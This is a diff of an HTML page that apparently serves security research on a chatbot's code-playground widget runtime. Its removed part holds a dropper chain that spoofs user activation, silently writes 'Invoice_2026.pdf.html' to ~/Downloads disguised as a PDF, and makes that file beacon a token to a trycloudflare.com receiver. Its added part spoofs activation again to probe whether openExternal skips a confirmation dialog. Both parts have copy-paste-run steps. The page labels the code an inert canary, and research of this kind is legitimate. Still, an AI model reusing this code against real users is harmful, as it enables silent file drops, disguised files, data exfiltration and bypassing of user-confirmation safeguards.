@@ -1,109 +1,95 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Pluto Research - Clean Copy Page</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Pluto playground clean-copy</title>
 <style>
-body { margin:0; background:#111; color:#eee; font:14px/1.5 ui-monospace,Menlo,monospace; display:flex; flex-direction:column; min-height:100vh; }
-header { padding:16px; border-bottom:2px solid #e33; display:flex; gap:12px; align-items:center; flex-wrap:wrap; }
-h1 { font-size:16px; margin:0; color:#fff; }
-button { font:600 14px ui-monospace,Menlo,monospace; background:#e33; color:#fff; border:0; border-radius:8px; padding:10px 18px; cursor:pointer; }
-button:hover { background:#f55; }
-.note { color:#9ab; font-size:12px; }
-#wrap { flex:1; overflow:auto; padding:16px; }
-pre#code { background:#000; color:#9f9; padding:16px; border-radius:10px; white-space:pre-wrap; word-break:break-all; tab-size:2; }
-footer { padding:12px 16px; color:#789; font-size:12px; border-top:1px solid #333; }
+body{font-family:-apple-system,BlinkMacSystemFont,monospace;background:#0d1117;color:#c9d1d9;margin:0;padding:16px}
+h1{font-size:16px;color:#58a6ff}
+#hdr{font-size:13px;color:#8b949e;margin-bottom:12px;white-space:pre-wrap}
+button{width:100%;height:56px;font-size:17px;font-weight:600;background:#238636;color:#fff;border:none;border-radius:10px;cursor:pointer}
+#code{display:none}
 </style>
 </head>
 <body>
-<header>
-  <h1>T66-DROPPER-EXFIL - inert copy-paste canary (Pluto Security research)</h1>
-  <button onclick="copyCode()">Copy code</button>
-  <span class="note">then paste into the playground Output box and press Run</span>
-</header>
-<div id="wrap"><pre id="code">/* T66 - DROPPER-EXFIL CHAIN, INERT CANARY. Question: can the silently
-   dropped file finish the exfiltration - bypassing every warning that
-   gates the page itself?
-   Chain under test (research annex row 1, &quot;verified file:// leg&quot; now
-   tested END-TO-END on the real victim path):
-   1. spoofed activation (T11-proven) -&gt; anchor-click download through
-      the host&#x27;s own bootstrap interceptor (T29/T30-proven) -&gt; silent
-      zero-click write of &quot;Invoice_2026.pdf.html&quot; to ~/Downloads.
-      Finder hides the final extension by default -&gt; victim sees
-      &quot;Invoice_2026.pdf&quot;.
-   2. File content = INERT clearly-labeled canary page with the token
-      baked in AT WRITE TIME (same mechanism that would bake captured
-      credentials in a real attack).
-   3. The researcher double-clicks the file ONCE in Finder (the single
-      victim action). It opens as a file:// page - no CSP, no gates.
-      The page then beacons the token to the researcher&#x27;s OWN receiver
-      (fetch + img fallback) and logs results on-screen.
-   Ground truth = the receiver log. Nothing real is stolen. */
+<h1>Pluto Security — playground clean copy</h1>
+<div id="hdr">PAYLOAD: T70b — mobile openExternal gate probe (inert canary)
+TARGET RUNTIME: native mobile app (Skybridge) — run via Paste&amp;Run in the phone app.
+Epoch: 1792652641
+
+Tap COPY, paste into the playground editor in the ChatGPT app, press Run.
+Watch: does a confirmation dialog appear before the browser opens?</div>
+<button onclick="navigator.clipboard.writeText(document.getElementById('code').textContent).then(function(){this.textContent='COPIED — paste it in the phone app'});this.textContent='COPIED — paste it in the phone app'">COPY PAYLOAD</button>
+<pre id="code">// T70b — mobile openExternal gate probe (Pluto Security research canary)
+// Question: in the native mobile app runtime (Skybridge), does the widget
+// openExternal hand off to the OS browser WITHOUT any confirmation dialog
+// (web shows &quot;Open external link?&quot; — T64/T45)? example.com = known-safe
+// control (T49c positive on web). Inert: no data captured, nothing real sent.
 (function () {
-  function log(m) { try { console.log(&quot;[T66] &quot; + m + &quot; @&quot; + Date.now()); } catch (e) {} }
-  var TOKEN = &quot;T66-&quot; + Date.now();
-  log(&quot;START dropper-exfil canary, token &quot; + TOKEN + &quot;, origin &quot; + location.origin);
+  var API = window.oai || window.openai || window.webplus;
+  var EPOCH = 1792652641;
+  var URL = &quot;https://example.com/#T70-&quot; + EPOCH + &quot;-openexternal&quot;;
 
-  /* --- spoof activation (T11-proven) --- */
+  // T11-proven activation spoof (openExternal is in the ao activation-gated set)
   try {
-    Object.defineProperty(navigator, &quot;userActivation&quot;, { get: function () { return { isActive: true }; } });
-    log(&quot;activation spoofed&quot;);
-  } catch (e) { log(&quot;spoof ERR &quot; + e.message); }
+    Object.defineProperty(navigator, &quot;userActivation&quot;, {
+      get: function () { return { isActive: true, hasBeenActive: true }; },
+      configurable: true
+    });
+  } catch (e) {}
 
-  /* --- the inert canary page that will be written to ~/Downloads --- */
-  var R = &quot;https://between-notified-postposted-classic.trycloudflare.com/leak?d=&quot;;
-  var html = [
-    &quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\&quot;utf-8\&quot;&gt;&lt;title&gt;Invoice_2026&lt;/title&gt;&lt;/head&gt;&quot;,
-    &quot;&lt;body style=\&quot;font:13px Menlo,monospace;background:#fff;color:#000;padding:18px\&quot;&gt;&quot;,
-    &quot;&lt;h3&gt;PLUTO SECURITY RESEARCH CANARY - INERT - NOTHING REAL&lt;/h3&gt;&quot;,
-    &quot;&lt;p&gt;This file was silently written to ~/Downloads from a chatgpt.com research payload.&lt;/p&gt;&quot;,
-    &quot;&lt;p&gt;Token: &quot; + TOKEN + &quot;&lt;/p&gt;&quot;,
-    &quot;&lt;pre id=\&quot;out\&quot;&gt;file:// page loaded... beacon pending&lt;/pre&gt;&quot;,
-    &quot;&lt;script&gt;&quot;,
-    &quot;var R = \&quot;&quot; + R + &quot;\&quot;;&quot;,
-    &quot;function log(m){ var o = document.getElementById(\&quot;out\&quot;); o.textContent += \&quot;\\n\&quot; + m; }&quot;,
-    &quot;log(\&quot;loaded as file:// page at \&quot; + Date.now());&quot;,
-    &quot;try {&quot;,
-    &quot;  fetch(R + \&quot;&quot; + TOKEN + &quot;-fetch-\&quot; + Date.now())&quot;,
-    &quot;    .then(function(r){ log(\&quot;FETCH BEACON SENT, status=\&quot; + r.status + \&quot; (exfil leg VERIFIED)\&quot;); })&quot;,
-    &quot;    .catch(function(e){ log(\&quot;fetch blocked: \&quot; + e.message); });&quot;,
-    &quot;} catch(e) { log(\&quot;fetch threw: \&quot; + e.message); }&quot;,
-    &quot;var i = new Image();&quot;,
-    &quot;i.onload = function(){ log(\&quot;IMG BEACON SENT (exfil leg VERIFIED)\&quot;); };&quot;,
-    &quot;i.onerror = function(){ log(\&quot;img beacon failed\&quot;); };&quot;,
-    &quot;i.src = R + \&quot;&quot; + TOKEN + &quot;-img-\&quot; + Date.now();&quot;,
-    &quot;&lt;\/script&gt;&lt;/body&gt;&lt;/html&gt;&quot;
+  var d = document;
+  var css = d.createElement(&quot;style&quot;);
+  css.textContent = [
+    &quot;#t70-ov{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.6);display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,&#x27;Segoe UI&#x27;,Helvetica,Arial,sans-serif;padding:16px;box-sizing:border-box}&quot;,
+    &quot;#t70-card{width:100%;max-width:420px;box-sizing:border-box;background:#212121;border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:22px;color:#fff;text-align:left}&quot;,
+    &quot;#t70-card h1{font-size:17px;font-weight:600;margin:0 0 6px}&quot;,
+    &quot;#t70-card p{font-size:13px;color:#9b9b9b;line-height:1.5;margin:0 0 14px}&quot;,
+    &quot;#t70-st{font-family:Menlo,Consolas,monospace;font-size:12px;line-height:1.8;border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:12px;background:rgba(0,0,0,.35);color:#e8e8e8;word-break:break-all}&quot;,
+    &quot;#t70-st b{color:#7ee787}&quot;,
+    &quot;#t70-x{margin-top:14px;width:100%;height:42px;background:transparent;border:1px solid rgba(255,255,255,.2);border-radius:999px;color:#fff;font-size:14px}&quot;
   ].join(&quot;&quot;);
+  var ov = d.createElement(&quot;div&quot;);
+  ov.id = &quot;t70-ov&quot;;
+  ov.appendChild(css);
+  var card = d.createElement(&quot;div&quot;);
+  card.id = &quot;t70-card&quot;;
+  card.innerHTML =
+    &quot;&lt;h1&gt;T70b — mobile openExternal probe&lt;/h1&gt;&quot; +
+    &#x27;&lt;p&gt;Research canary (Pluto Security, inert). Watch your screen: &lt;b style=&quot;color:#fff&quot;&gt;did a confirmation dialog appear before the browser opened, or did example.com open silently?&lt;/b&gt;&lt;/p&gt;&#x27; +
+    &#x27;&lt;div id=&quot;t70-st&quot;&gt;&lt;/div&gt;&#x27;;
+  ov.appendChild(card);
+  var x = d.createElement(&quot;button&quot;);
+  x.id = &quot;t70-x&quot;; x.type = &quot;button&quot;; x.textContent = &quot;Close&quot;;
+  x.onclick = function () { ov.remove(); };
+  card.appendChild(x);
+  d.body.appendChild(ov);
 
-  /* --- silent write via the host&#x27;s own download bootstrap (T29/T30-proven) --- */
+  function st(html) { var e = d.getElementById(&quot;t70-st&quot;); if (e) e.innerHTML += html; }
+  st(&quot;token: T70-&quot; + EPOCH + &quot;&lt;br&gt;&quot;);
+  st(&quot;api: &quot; + (API &amp;&amp; API.openExternal ? &quot;&lt;b&gt;oai.openExternal present&lt;/b&gt;&quot; : &quot;ABSENT&quot;) + &quot;&lt;br&gt;&quot;);
+  st(&quot;spoof: userActivation set&lt;br&gt;&quot;);
+  st(&quot;call: openExternal example.com ...&lt;br&gt;&quot;);
+
   try {
-    var blob = new Blob([html], { type: &quot;text/html&quot; });
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement(&quot;a&quot;);
-    a.href = url;
-    a.download = &quot;Invoice_2026.pdf.html&quot;;
-    a.style.display = &quot;none&quot;;
-    document.body.appendChild(a);
-    a.click();
-    setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 4000);
-    log(&quot;WRITE FIRED: Invoice_2026.pdf.html (Finder shows Invoice_2026.pdf)&quot;);
-    log(&quot;NEXT: check ~/Downloads, then double-click the file ONCE in Finder&quot;);
-  } catch (e) { log(&quot;write ERR &quot; + e.message); }
-
-  log(&quot;DONE - watch ~/Downloads and the receiver log&quot;);
+    if (API &amp;&amp; API.openExternal) {
+      API.openExternal({ href: URL }).then(
+        function (r) {
+          st(&quot;result: &lt;b&gt;RESOLVED&lt;/b&gt; &quot; + JSON.stringify(r == null ? &quot;undefined&quot; : r) + &quot;&lt;br&gt;&quot;);
+          st(&quot;check: any dialog shown before the browser/view opened?&quot;);
+        },
+        function (e) {
+          st(&quot;result: &lt;b&gt;REJECTED&lt;/b&gt; &quot; + (e &amp;&amp; e.message ? e.message : String(e)) + &quot;&lt;br&gt;&quot;);
+        }
+      );
+    } else {
+      st(&quot;result: openExternal absent in this runtime&lt;br&gt;&quot;);
+    }
+  } catch (e) {
+    st(&quot;result: THREW &quot; + (e &amp;&amp; e.message ? e.message : String(e)) + &quot;&lt;br&gt;&quot;);
+  }
 })();
-</pre></div>
-<footer>inert research canary - inbound fetch control only, no exfiltration</footer>
-<script>
-function copyCode() {
-  var t = document.getElementById('code').textContent;
-  navigator.clipboard.writeText(t).then(function() {
-    var b = document.querySelector('button');
-    b.textContent = 'Copied!';
-    setTimeout(function() { b.textContent = 'Copy code'; }, 1500);
-  });
-}
-</script>
+</pre>
 </body>
 </html>
